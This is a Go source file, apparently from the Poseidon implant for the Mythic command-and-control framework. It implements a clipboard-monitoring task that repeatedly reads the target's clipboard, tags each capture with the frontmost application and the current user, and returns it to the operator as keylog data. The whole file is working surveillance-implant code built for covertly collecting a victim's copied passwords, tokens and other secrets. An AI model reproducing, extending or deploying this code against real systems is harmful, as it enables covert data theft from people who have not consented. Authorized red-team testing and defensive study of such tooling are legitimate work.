package clipboard_monitor

import (
	// Standard
	"encoding/json"

	// Poseidon

	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/pkg/utils/functions"
	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/pkg/utils/structs"
)

type Arguments struct {
	Duration int `json:"duration"`
}

func Run(task structs.Task) {
	//procs, err := Processes()
	msg := structs.Response{}
	msg.TaskID = task.TaskID
	params := Arguments{}
	if err := json.Unmarshal([]byte(task.Params), &params); err != nil {
		msg.SetError(err.Error())
		task.Job.SendResponses <- msg
		return
	} else {
		elapsedDuration := 0
		currentClipboardCount := 0
		var err error
		for params.Duration < 0 || elapsedDuration < params.Duration {
			if task.ShouldStop() {
				//msg.UserOutput = "\n\nTasked to stop"
				msg.Completed = true
				msg.Status = "completed"
				task.Job.SendResponses <- msg
				return
			}
			if output, err := CheckClipboard(currentClipboardCount); err != nil {
				msg.UserOutput = err.Error()
				msg.Completed = true
				msg.Status = "error"
				task.Job.SendResponses <- msg
				return
			} else if output != "" {
				msg.UserOutput = output
				keylogData := make([]structs.Keylog, 1)
				keylogData[0].Keystrokes = output
				keylogData[0].WindowTitle, _ = GetFrontmostApp()
				keylogData[0].User = functions.GetUser()
				msg.Keylogs = &keylogData
				task.Job.SendResponses <- msg
			}
			if currentClipboardCount, err = GetClipboardCount(); err != nil {
				msg.UserOutput = err.Error()
				msg.Completed = true
				msg.Status = "error"
				task.Job.SendResponses <- msg
				return
			}
			elapsedDuration++
			WaitForTime()
			//time.Sleep(1 * time.Second)
		}
		msg.Completed = true
		msg.UserOutput = "\n\n[*] Finished Monitoring"
		task.Job.SendResponses <- msg
		return
	}
}
